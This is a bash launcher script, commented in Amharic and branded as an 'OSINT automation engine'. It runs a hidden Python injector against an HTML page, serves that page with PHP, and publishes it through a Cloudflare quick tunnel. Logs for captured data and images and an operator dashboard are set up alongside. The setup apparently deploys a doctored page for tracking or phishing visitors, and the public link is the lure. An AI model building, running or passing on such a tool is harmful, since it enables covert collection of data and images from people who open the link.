#!/bin/bash

# --- ቀለሞች እና ዲዛይን ---
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# --- የማጽጃ ፈንክሽን ---
cleanup() {
    echo -e "\n${RED}[!] ሲስተሙ እየተዘጋ ነው...${NC}"
    killall php cloudflared > /dev/null 2>&1
    exit
}
trap cleanup SIGINT

clear
echo -e "${CYAN}${BOLD}"
echo "  ██████╗ ███████╗██╗███╗   ██╗████████╗"
echo "  ██╔══██╗██╔════╝██║████╗  ██║╚══██╔══╝"
echo "  ██║  ██║███████╗██║██╔██╗ ██║   ██║   "
echo "  ██║  ██║╚════██║██║██║╚██╗██║   ██║   "
echo "  ██████╔╝███████║██║██║ ╚████║   ██║   "
echo "  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   "
echo -e "      ${PURPLE}OSINT AUTOMATION ENGINE V4${NC}"
echo -e "${BLUE}============================================${NC}"

# 1. አስፈላጊ ነገሮችን ማዘጋጀት
echo -e "${YELLOW}[*] ሲስተሙን በማዘጋጀት ላይ...${NC}"
mkdir -p logs/images core
touch logs/data.txt
chmod -R 777 logs core
# አሮጌ PHP ካለ ማጥፋት
killall php > /dev/null 2>&1

# 2. ኢንፑት መቀበል
echo -e -n "${GREEN}[?]${NC} የ HTML ፋይል ስም (default: index.html): "
read filename
filename=${filename:-index.html}

if [ ! -f "$filename" ]; then
    echo -e "${RED}[-][ERROR] $filename አልተገኘም!${NC}"
    exit 1
fi

echo -e -n "${GREEN}[?]${NC} የ Port ቁጥር (default: 8080): "
read port
port=${port:-8080}

# 3. የፓይዘን ኢንጄክተርን ማስኬድ
echo -e "${YELLOW}[*] ኢንጄክሽን እየተከናወነ ነው...${NC}"
python3 .engine.py "$filename"
echo -e "${GREEN}[+] ኢንጄክሽን ተጠናቋል።${NC}"

# 4. PHP ሰርቨር ማስጀመር
echo -e "${YELLOW}[*] የ PHP ሰርቨርን በ Port $port እያስነሳሁ ነው...${NC}"
php -S 0.0.0.0:$port > /dev/null 2>&1 &
sleep 2

# 5. Cloudflare Tunnel (The "Clean" Way)
echo -e "${BLUE}--------------------------------------------${NC}"
echo -e "${PURPLE}${BOLD}[!] የ CLOUDFLARE ሊንክ እየተፈጠረ ነው...${NC}"
echo -e "${BLUE}--------------------------------------------${NC}"

# አሮጌ ሎግ ካለ ማጥፋት
rm -f .cftunnel.log

# Cloudflareን ማስጀመር (stderr ን ወደ stdout በመቀየር)
cloudflared tunnel --url http://localhost:$port > .cftunnel.log 2>&1 &

# ሊንኩ እስኪመጣ በትዕግስት መጠበቅ (Animation ጭምር)
echo -n -e "${YELLOW}[*] ሊንኩን በመፈለግ ላይ "
CF_URL=""
for i in {1..30}; do
    echo -n "."
    sleep 1
    # ሊንኩን በደንብ መፈለግ
    CF_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cftunnel.log | head -n 1)
    if [ ! -z "$CF_URL" ]; then
        echo -e " ${GREEN}ተገኝቷል!${NC}"
        break
    fi
done

echo -e "\n"

if [ -z "$CF_URL" ]; then
    echo -e "${RED}[-] ስህተት፦ ሊንኩን ማመንጨት አልተቻለም።${NC}"
    echo -e "${RED}[-] ምናልባት የኢንተርኔት ግንኙነት የለም ወይም cloudflared ተዘግቷል።${NC}"
    echo -e "${YELLOW}[i] ለማረጋገጥ 'cat .cftunnel.log' ብለህ እይ።${NC}"
else
    echo -e "${GREEN}${BOLD}--------------------------------------------"
    echo -e "  ✅ ስራው ተጠናቋል! "
    echo -e "  🌐 የህዝብ ሊንክ: ${YELLOW}$CF_URL"
    echo -e "  📊 ዳሽቦርድ: ${CYAN}http://localhost:$port/core/dashboard.php"
    echo -e "${GREEN}--------------------------------------------${NC}"
    
    # --- አዲሱ ክፍል እዚህ ይጀምራል ---
    DASHBOARD_URL="http://localhost:$port/core/dashboard.php"
    if command -v termux-open-url &> /dev/null; then
        sleep 2 # ሰርቨሩ በደንብ እስኪነሳ ትንሽ መጠበቅ
        termux-open-url "$DASHBOARD_URL"
    fi
    # --- አዲሱ ክፍል እዚህ ያበቃል ---
fi

echo -e "${YELLOW}[i] ሲስተሙን ለማቆም CTRL+C ይጫኑ።${NC}"
wait